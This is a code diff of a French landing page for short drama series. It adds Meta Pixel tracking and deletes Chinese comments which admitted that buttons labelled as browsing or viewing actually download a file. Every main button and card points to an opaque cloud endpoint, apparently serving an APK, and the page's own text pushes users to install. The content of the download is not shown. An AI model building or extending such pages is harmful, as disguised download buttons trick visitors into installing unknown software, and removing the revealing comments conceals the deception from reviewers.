@@ -7,6 +7,24 @@
 <meta name="description" content="Découvrez les meilleures mini-séries.">
 <title>MiniDrama - Séries courtes</title>
 
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2323708731748299');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2323708731748299&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
 <style>
 :root {
   --bg:#0b0a10;
@@ -139,7 +157,6 @@ main { max-width:1280px; margin:auto; padding:26px 22px 40px; }
     <div class="search">
       <input id="searchInput" type="search" placeholder="Rechercher une série...">
     </div>
-    <!-- 顶部按钮：文字保持原样，点击实际下载 -->
     <a class="nav-cta" id="navDownload">▶ Découvrir</a>
   </nav>
 </header>
@@ -150,7 +167,6 @@ main { max-width:1280px; margin:auto; padding:26px 22px 40px; }
     <div class="eyebrow">Téléchargez et débloquez tout</div>
     <h1>Une histoire incroyable.<br>Un épisode après l’autre.</h1>
     <p>Cliquez pour télécharger. Après l’installation, débloquez toutes les séries. Tout est gratuit, sans publicité.</p>
-    <!-- 横幅按钮：文字保持原样，点击实际下载 -->
     <a class="hero-action" id="heroDownload">Explorer les séries →</a>
   </section>
 
@@ -196,7 +212,6 @@ main { max-width:1280px; margin:auto; padding:26px 22px 40px; }
   <p class="bottom-note">MiniDrama · Des histoires courtes à découvrir chaque jour</p>
 </main>
 
-<!-- 底部固定栏 -->
 <div class="fixed-bottom">
   <a id="bottomDownload">Installer pour débloquer tout le contenu</a>
 </div>
@@ -209,9 +224,8 @@ main { max-width:1280px; margin:auto; padding:26px 22px 40px; }
 </nav>
 
 <script>
-// ==================== 统一下载 API（改这里即可） ====================
+// 统一下载 API
 const DOWNLOAD_URL = "https://tacuehjb2zswi3vfaxkuo4sb4a0sexxu.lambda-url.eu-west-3.on.aws/C77QhEvWRYeN";
-// 如果是本地 apk，改成： const DOWNLOAD_URL = "app.apk";
 
 const DRAMAS = [
   {image:"v01.webp",title:"La promesse de minuit",episodes:"37 épisodes",category:"Recommandé"},
@@ -291,7 +305,6 @@ function createCard(drama) {
   episodes.className = "episodes";
   episodes.textContent = drama.episodes;
 
-  // 卡片按钮文字改为「Voir l’intégrale」，但点击仍然下载
   const button = document.createElement("a");
   button.className = "download-btn";
   button.href = DOWNLOAD_URL;
@@ -323,7 +336,6 @@ document.getElementById("adultTitle").addEventListener("click", function() {
   document.getElementById("adult").classList.toggle("open");
 });
 
-// 所有主要按钮统一绑定下载 API
 function bindDownload(id) {
   const el = document.getElementById(id);
   if (el) {
